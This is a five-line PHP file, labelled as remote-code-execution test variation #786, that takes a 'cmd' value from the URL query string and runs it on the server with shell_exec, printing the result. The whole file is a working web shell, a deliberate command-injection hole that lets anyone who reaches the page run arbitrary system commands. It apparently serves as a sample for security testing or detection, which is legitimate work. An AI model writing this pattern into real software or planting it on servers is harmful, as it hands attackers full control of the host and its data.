<?php
// RCE test variation #786
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>